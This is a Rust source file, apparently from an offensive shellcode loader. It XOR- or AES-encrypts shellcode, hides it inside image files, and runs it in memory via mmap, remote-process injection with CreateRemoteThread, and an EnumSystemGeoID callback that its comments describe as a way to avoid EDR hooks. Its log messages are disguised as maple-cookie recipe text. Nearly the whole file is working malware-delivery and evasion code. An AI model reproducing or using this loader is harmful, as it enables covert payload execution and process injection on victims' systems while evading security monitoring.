// ToBeatElite

use mmap_fixed::MapOption::*;
use std::fs::OpenOptions;
use std::io::Write;
use std::mem;
use std::ptr;

#[cfg(windows)]
extern crate kernel32;
#[cfg(windows)]
use winapi::um::winnls::{EnumSystemGeoID, GEO_ENUMPROC};
#[cfg(windows)]
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PROCESS_ALL_ACCESS};

use bstr::ByteSlice;
use serde_derive::{Deserialize, Serialize};

use aes_gcm::{
    aead::{AeadInPlace, KeyInit, OsRng},
    Aes256Gcm, Nonce,
};

use rand::{
    distributions::{Alphanumeric, Uniform},
    Rng,
};

#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct ShellCode {
    pub sc: Vec<u8>,
}

#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct XoredShellCode {
    pub sc: ShellCode,
    pub xor_key: String,
}

#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct AESShellCode {
    pub sc: ShellCode,
    pub nonce: Vec<u8>,
    pub assoc_data: Vec<u8>,
    pub key: Vec<u8>,
}

const SHELLCODE_EGG_THING: &[u8] =
    b"you mirin mah shellcode brah? rust lang best lang, c is for nerds";

impl ShellCode {
    pub fn from_file(input_path: &str) -> ShellCode {
        match ShellCode::import_sc(input_path, "xor") {
            Ok(my_xor_object) => my_xor_object,
            Err(_) => match ShellCode::import_sc(input_path, "aes") {
                Ok(my_aes_object) => my_aes_object,
                Err(_) => ShellCode::import_sc(input_path, "plain").unwrap(),
            },
        }
    }

    pub fn from_image(input_path: &str) -> ShellCode {
        let input_file = match std::fs::read(input_path.clone()) {
            Ok(result) => result,
            Err(error) => {
                println!("[+] shellcode path error {:?}", error);
                std::process::exit(0x0100);
            }
        };

        let result: Vec<Vec<u8>> = input_file
            .split_str(&SHELLCODE_EGG_THING.clone().to_vec())
            .map(|x| x.to_vec())
            .collect();

        let sc_object = match ShellCode::import_sc_image(result[1].clone(), "xor") {
            Ok(my_xor_object) => my_xor_object,
            Err(_) => ShellCode::import_sc_image(result[1].clone(), "aes").unwrap(),
        };

        sc_object
    }

    fn import_sc(input_path: &str, mode: &str) -> anyhow::Result<ShellCode> {
        let shellcode = match std::fs::read(input_path) {
            Ok(result) => result,
            Err(error) => {
                println!(
                    "[+] n'a pas lu la recette des biscuits à l'érable : {:?}",
                    error
                );
                std::process::exit(0x0100);
            }
        };

        match mode {
            "xor" => {
                println!("[+] la recette des biscuits à l'érable dectected as XOR encrypted");
                let decoded_xor_object: XoredShellCode = bincode::deserialize(&shellcode)?;
                Ok(decoded_xor_object.xor())
            }
            "aes" => {
                println!(
                    "[+] la recette du cookie à l'érable a été détectée comme étant cryptée AES"
                );
                let decoded_aes_object: AESShellCode = bincode::deserialize(&shellcode)?;
                Ok(decoded_aes_object.decrypt())
            }
            "plain" => {
                println!("[+] la recette des biscuits à l'érable must be raw/normal");
                Ok(ShellCode { sc: shellcode })
            }
            &_ => todo!(),
        }
    }

    fn import_sc_image(deserialized_sc: Vec<u8>, mode: &str) -> anyhow::Result<ShellCode> {
        match mode {
            "xor" => {
                println!("[+] la recette des biscuits à l'érable dectected as XOR encrypted");
                let decoded_xor_object: XoredShellCode = bincode::deserialize(&deserialized_sc)?;
                Ok(decoded_xor_object.xor())
            }
            "aes" => {
                println!(
                    "[+] la recette du cookie à l'érable a été détectée comme étant cryptée AES"
                );
                let decoded_aes_object: AESShellCode = bincode::deserialize(&deserialized_sc)?;
                Ok(decoded_aes_object.decrypt())
            }
            &_ => todo!(),
        }
    }

    pub fn load(self) {
        /*
        load shellcode into memory by leveraging the mmap create, which will then call mmap on POSIX, and VirtualAlloc/CreateFileMapping on Windows

        https://docs.rs/mmap/0.1.1/mmap/struct.MemoryMap.html
        https://kerkour.com/rust-execute-from-memory
        */

        let map =
            mmap_fixed::MemoryMap::new(self.sc.len(), &[MapReadable, MapWritable, MapExecutable])
                .unwrap();

        unsafe {
            std::ptr::copy(self.sc.as_ptr(), map.data(), self.sc.len());
            println!(
                "[+] fixer les protections de la mémoire à {:p}",
                self.sc.as_ptr()
            );

            let exec_shellcode: extern "C" fn() -> ! = mem::transmute(map.data());
            println!("[+] commencer la recette des biscuits à l'érable");
            exec_shellcode();
        }
    }

    #[cfg(unix)]
    pub fn load_CreateRemoteThread(self) {
        println!("[+] not supported on unix");
    }

    #[cfg(windows)]
    pub fn load_CreateRemoteThread(self, pid: u32) {
        /*
        you already know what this is

        https://github.com/trickster0/OffensiveRust/blob/master/Process_Injection_CreateRemoteThread/src/main.rs
        https://tbhaxor.com/createremotethread-process-injection/
        */

        unsafe {
            let mut h = kernel32::OpenProcess(
                PROCESS_ALL_ACCESS,
                winapi::shared::ntdef::FALSE.into(),
                pid.clone(),
            );
            println!("[+] opening process with PID {}", pid);
            let mut addr = kernel32::VirtualAllocEx(
                h,
                ptr::null_mut(),
                self.sc.len() as u64,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            );
            let mut n = 0;
            kernel32::WriteProcessMemory(
                h,
                addr,
                self.sc.as_ptr() as _,
                self.sc.len() as u64,
                &mut n,
            );
            let mut hThread = kernel32::CreateRemoteThread(
                h,
                ptr::null_mut(),
                0,
                Some(std::mem::transmute(addr)),
                ptr::null_mut(),
                0,
                ptr::null_mut(),
            );
            println!("[+] commencer la recette des biscuits à l'érable");
            kernel32::CloseHandle(h);
        }
    }

    #[cfg(unix)]
    pub fn load_EnumSystemGeoID(self) {
        println!("[+] not supported on unix");
    }

    #[cfg(windows)]
    pub fn load_EnumSystemGeoID(self) {
        /*
        this runs in the current process just like load(). but this uses a wack ass API Call that might not be hooked by EDR.
        that makes this a bit more stealthy, however it still uses VirtualAlloc so you may need to unhook it

        https://github.com/trickster0/OffensiveRust/blob/master/Process_Injection_Self_EnumSystemGeoID/src/main.rs
        https://www.cybermongol.ca/operator-research/callback-shellcode-injection
        */

        unsafe {
            let curr_proc = kernel32::GetCurrentProcessId();

            println!("[+] current pid: {}", curr_proc.to_string());

            let base_addr = kernel32::VirtualAlloc(
                ptr::null_mut(),
                self.sc.len().try_into().unwrap(),
                MEM_COMMIT,
                PAGE_EXECUTE_READWRITE,
            );

            std::ptr::copy(self.sc.as_ptr() as _, base_addr, self.sc.len());

            println!("[+] commencer la recette des biscuits à l'érable");

            // Callback execution
            let res = EnumSystemGeoID(
                16,
                0,
                mem::transmute::<*mut std::ffi::c_void, GEO_ENUMPROC>(base_addr),
            );
        }
    }
}

impl XoredShellCode {
    pub fn new(sc_bytearray: ShellCode) -> XoredShellCode {
        let mut xored_shellcode = sc_bytearray.sc.clone();
        let xor_key: String = rand::thread_rng()
            .sample_iter(&Alphanumeric)
            .take(64)
            .map(char::from)
            .collect();

        println!("[+] encrypting la recette des biscuits à l'érable using XOR");
        println!(
            "[+] xor_key (first 5 bytes): {:#04X?}",
            xor_key.as_bytes().to_vec()[0..5].to_vec()
        );
        for xor_char in xor_key.chars() {
            if xor_char != ' ' {
                for (index, value) in sc_bytearray.sc.iter().enumerate() {
                    std::mem::replace(&mut xored_shellcode[index], value ^ (xor_char as u8 - b'0'));
                }
            }
        }

        XoredShellCode {
            xor_key,
            sc: ShellCode {
                sc: xored_shellcode,
            },
        }
    }

    pub fn xor(self) -> ShellCode {
        let mut xored_shellcode = self.sc.sc.clone();
        println!("[+] cryptant la recette des cookies à l'érable en utilisant XOR");
        println!(
            "[+] xor_key (first 5 bytes): {:#04X?}",
            self.xor_key.as_bytes().to_vec()[0..5].to_vec()
        );
        for xor_char in self.xor_key.chars() {
            if xor_char != ' ' {
                for (index, value) in self.sc.sc.iter().enumerate() {
                    std::mem::replace(&mut xored_shellcode[index], value ^ (xor_char as u8 - b'0'));
                }
            }
        }

        ShellCode {
            sc: xored_shellcode,
        }
    }

    pub fn output_to_file(self, output_path: &str) {
        let serialized_self = bincode::serialize(&self).unwrap();

        let mut file = match OpenOptions::new()
            .write(true)
            .create_new(true)
            .open(output_path.clone())
        {
            Ok(result) => result,
            Err(_error) => {
                println!("[+] le fichier de sortie existe déjà {}", output_path);
                std::process::exit(0x0100);
            }
        };

        file.write_all(&serialized_self).unwrap();
        println!(
            "[+] a écrit une recette de cookies à l'érable cryptée XOR en {}",
            output_path
        );
    }

    pub fn output_to_image(self, output_pic_path: &str, input_pic: &str) {
        let original_pic = match std::fs::read(input_pic) {
            Ok(result) => result,
            Err(error) => {
                println!("[+] original pic error {:?}", error);
                std::process::exit(0x0100);
            }
        };

        let mut output_pic = match OpenOptions::new()
            .write(true)
            .create_new(true)
            .open(output_pic_path)
        {
            Ok(result) => result,
            Err(_error) => {
                println!("[+] output path {} already exsists", output_pic_path);
                std::process::exit(0x0100);
            }
        };

        let serialized_self = bincode::serialize(&self).unwrap();

        let mut final_vec = vec![];
        final_vec.extend(original_pic);
        final_vec.extend(SHELLCODE_EGG_THING.clone().to_vec());
        final_vec.extend(serialized_self);
        output_pic.write_all(&final_vec).unwrap();

        println!("[*] you can 'mire the shellcode in {} now", output_pic_path);
    }
}

impl AESShellCode {
    pub fn new(sc_bytearray: ShellCode) -> AESShellCode {
        let key = Aes256Gcm::generate_key(&mut OsRng).to_vec();
        let cipher = Aes256Gcm::new_from_slice(&key).unwrap();

        let rand_assoc_data: Vec<u8> = rand::thread_rng()
            .sample_iter(Uniform::from(1..255))
            .take(64)
            .collect();
        let rand_nonce: Vec<u8> = rand::thread_rng()
            .sample_iter(Uniform::from(1..255))
            .take(12)
            .collect();
        let nonce = Nonce::from_slice(&rand_nonce);

        let mut sc_copy = sc_bytearray;
        cipher.encrypt_in_place(nonce, &rand_assoc_data, &mut sc_copy.sc);

        println!("[+] cryptant la recette des cookies à l'érable en utilisant AES");
        println!("[+] key: (first 5 bytes) {:#04X?}", key[0..5].to_vec());
        println!(
            "[+] nonce: (first 5 bytes) {:#04X?}",
            rand_nonce.clone()[0..5].to_vec()
        );
        println!(
            "[+] assoc_data: (first 5 bytes) {:#04X?}",
            rand_assoc_data.clone()[0..5].to_vec()
        );

        AESShellCode {
            sc: sc_copy,
            nonce: rand_nonce,
            assoc_data: rand_assoc_data,
            key,
        }
    }

    pub fn decrypt(mut self) -> ShellCode {
        println!("[+] décryptage de la recette des cookies à l'érable en utilisant AES");
        println!("[+] key: (first 5 bytes) {:#04X?}", self.key[0..5].to_vec());
        println!(
            "[+] nonce: (first 5 bytes) {:#04X?}",
            self.nonce[0..5].to_vec()
        );
        println!(
            "[+] assoc_data: (first 5 bytes) {:#04X?}",
            self.assoc_data[0..5].to_vec()
        );

        let cipher = Aes256Gcm::new_from_slice(&self.key).unwrap();
        let nonce = Nonce::from_slice(&self.nonce);
        cipher.decrypt_in_place(nonce, &self.assoc_data, &mut self.sc.sc);

        self.sc
    }

    pub fn output_to_file(self, output_path: &str) {
        let serialized_self = bincode::serialize(&self).unwrap();

        let mut file = match OpenOptions::new()
            .write(true)
            .create_new(true)
            .open(output_path.clone())
        {
            Ok(result) => result,
            Err(_error) => {
                println!("[+] le fichier de sortie existe déjà {}", output_path);
                std::process::exit(0x0100);
            }
        };

        file.write_all(&serialized_self).unwrap();
        println!(
            "[+] a écrit une recette de cookies à l'érable cryptée AES en {}",
            output_path
        );
    }

    pub fn output_to_image(self, output_pic_path: &str, input_pic: &str) {
        let original_pic = match std::fs::read(input_pic) {
            Ok(result) => result,
            Err(error) => {
                println!("[+] original pic error {:?}", error);
                std::process::exit(0x0100);
            }
        };

        let mut output_pic = match OpenOptions::new()
            .write(true)
            .create_new(true)
            .open(output_pic_path)
        {
            Ok(result) => result,
            Err(_error) => {
                println!("[+] output path {} already exsists", output_pic_path);
                std::process::exit(0x0100);
            }
        };

        let serialized_self = bincode::serialize(&self).unwrap();

        let mut final_vec = vec![];
        final_vec.extend(original_pic);
        final_vec.extend(SHELLCODE_EGG_THING.clone().to_vec());
        final_vec.extend(serialized_self);
        output_pic.write_all(&final_vec).unwrap();

        println!("[*] you can 'mire the shellcode in {} now", output_pic_path);
    }
}
